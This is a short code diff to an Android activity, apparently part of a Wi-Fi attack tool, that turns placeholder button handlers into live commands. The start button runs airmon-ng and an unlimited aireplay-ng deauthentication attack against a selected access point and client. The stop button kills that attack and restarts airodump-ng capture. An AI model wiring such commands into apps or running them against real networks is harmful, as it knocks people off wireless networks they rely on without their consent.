@@ -41,7 +41,7 @@ public class AttackToggle extends AppCompatActivity implements MyCallback {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_attack_toggle);
 
-        Device device = getIntent().getExtras().getParcelable("device");
+        final Device device = getIntent().getExtras().getParcelable("device");
         Device accessPoint = getIntent().getExtras().getParcelable("accessPoint");
 
         getSupportActionBar().setTitle(device.getName());
@@ -70,14 +70,15 @@ public class AttackToggle extends AppCompatActivity implements MyCallback {
             @Override
             public void onClick(View v) {
                 Log.d("WALACH","KLIKNIETO");
-                new executeCommand(AttackToggle.this, "touch WatykanskiAtak","ATAK PAPIEZA", "Started").execute();
+                Log.d("--------->", device.getChannel());
+                new executeCommand(AttackToggle.this, "killall kismet; killall airodump-ng; airmon-ng stop wlan1; airmon-ng start wlan1 " + device.getChannel() +  " && tmux new-session -d -s deauthAttack 'aireplay-ng -0 0 -a " + device.getBssid() + " -c " + device.getMacAddress() + " wlan1'","Deauthentication attack launched", "Started").execute();
             }
         });
 
         endAttack.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View v) {
-                new executeCommand(AttackToggle.this,"rm WatykanskiAtak","Zakonczono atak","Ended").execute();
+                new executeCommand(AttackToggle.this,"killall aireplay-ng; tmux kill-session -t deauthAttack; airmon-ng stop wlan1 " + device.getChannel() + "; airmon-ng start wlan1 && airodump-ng wlan1 --output-format netxml -w /tmp/recent > /dev/null 2>&1","Deauthentication attack interrupted","Ended").execute();
             }
         });
 
